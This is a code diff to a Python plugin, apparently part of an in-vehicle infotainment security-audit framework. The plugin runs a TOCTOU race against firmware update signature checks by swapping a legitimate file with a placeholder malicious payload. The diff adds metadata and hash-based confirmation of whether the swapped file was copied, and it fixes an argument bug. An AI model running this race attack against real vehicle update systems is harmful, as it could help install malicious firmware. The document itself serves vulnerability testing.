@@ -14,12 +14,30 @@ import os
 import time
 import shutil
 import threading
+import hashlib
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class FwUpdateToctouPlugin(IVIVulnerabilityPlugin):
+    meta_poc_name = "FW Update TOCTOU"
+    meta_cve_id = "N/A"
+    meta_severity = "Medium"
+    meta_protocol = "rf"
+    meta_target_os = ["all"]
+    meta_required_params = ["target_dir"]
+    is_disruptive = False
+    meta_destructive_level = "Safe"
+
     def check_prerequisites(self):
         self.watch_dir = self.params.get("target_dir", "/tmp/ivi_update_mnt")
+        self.copied_artifact = self.params.get("copied_artifact")
         return True
+
+    def _sha256(self, path):
+        h = hashlib.sha256()
+        with open(path, "rb") as handle:
+            for chunk in iter(lambda: handle.read(65536), b""):
+                h.update(chunk)
+        return h.hexdigest()
 
     def exploit(self):
         self.logger.info("准备发起 Firmware 更新签名检验的 TOCTOU 竞争攻击...")
@@ -39,6 +57,8 @@ class FwUpdateToctouPlugin(IVIVulnerabilityPlugin):
         
         with open(legit_file, "w") as f: f.write("VALID_SIGNED_OEM_FIRMWARE")
         with open(evil_file, "w") as f: f.write("MALICIOUS_ROOT_SHELL_PAYLOAD")
+        legit_hash = self._sha256(legit_file)
+        evil_hash = self._sha256(evil_file)
         
         # 初始时放置合法文件，准备骗过第一次 Check
         if not os.path.exists(target_file):
@@ -75,17 +95,30 @@ class FwUpdateToctouPlugin(IVIVulnerabilityPlugin):
         for t in threads: t.join()
         
         self.logger.info(f"[+] 竞争测试结束，10秒内完成了 {self.swaps} 次文件闪换。")
-        self.logger.warning("[!] 请开启主系统的更新进程。如果在这一瞬间它读取并刷入了 MALICIOUS 载荷，请确认系统已中招(TOCTOU成功)。")
-        
+        if self.copied_artifact and os.path.exists(self.copied_artifact):
+            copied_hash = self._sha256(self.copied_artifact)
+            if copied_hash == evil_hash:
+                return {
+                    "status": "success",
+                    "vulnerable": True,
+                    "details": f"Observed copied artifact {self.copied_artifact} hash matches evil payload after {self.swaps} swaps."
+                }
+            if copied_hash == legit_hash:
+                return {
+                    "status": "success",
+                    "vulnerable": False,
+                    "details": f"Observed copied artifact {self.copied_artifact} still matches the legitimate firmware after {self.swaps} swaps."
+                }
+
         return {
             "status": "success",
-            "vulnerable": True, # 因为这是主动发起的替换探测，只能由审计员核实
-            "details": f"Performed {self.swaps} swaps. Watch OEM installer behavior."
+            "vulnerable": False,
+            "details": f"已执行 {self.swaps} 次竞态替换，但未提供 copied_artifact 或未捕获到目标复制结果，无法严格确认漏洞。"
         }
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 67_FW_Update_TOCTOU.py <target_update_dir>")
         sys.exit(1)
-    plugin = FwUpdateToctouPlugin({"target_dir": target})
+    plugin = FwUpdateToctouPlugin({"target_dir": sys.argv[1]})
     plugin.run_verify()
